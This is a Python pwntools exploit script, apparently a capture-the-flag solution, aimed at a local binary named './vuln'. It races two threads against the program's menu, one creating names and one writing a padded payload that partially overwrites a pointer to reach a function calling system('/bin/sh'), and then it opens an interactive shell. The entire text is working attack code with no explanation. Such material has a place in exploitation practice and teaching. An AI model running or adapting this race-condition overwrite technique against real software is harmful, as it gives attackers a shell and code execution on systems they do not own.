from pwn import *
import threading

success = False
 
def make(conn, name):
    conn.sendlineafter("> ", "2")
    conn.recvuntil("name? ")
    conn.sendline(name)

def change(conn, name):
    conn.sendlineafter("> ", "3")
    conn.sendlineafter("(yes/no):", "yes")
    conn.recvuntil("name? ")
    conn.sendline(name)

def display(conn):
    conn.sendlineafter("> ", "4")

# race condition trigger
def attack_vuln():
    while not success:
        conn = process("./vuln")
        for i in range(0, 300):
            make(conn, "a"*77)
        conn.close()

def writePayload():
    conn = process("./vuln")
    payload  = "D"*80
    payload += "A"*8
    payload += p8(0x6f)

    while not success:
        change(conn, payload)   # win function, 0x400a6f: system("/bin/sh")
    conn.close()


get_shell = process("./vuln")

race1_make = threading.Thread(target=attack_vuln)
race2_payload = threading.Thread(target=writePayload)

race1_make.start()
race2_payload.start()

while True:
    display(get_shell)
    result = get_shell.recv(18, timeout=3)
    if not "[?] empty function" in result:
        get_shell.sendline("/bin/sh")
        break
success = True

get_shell.interactive()
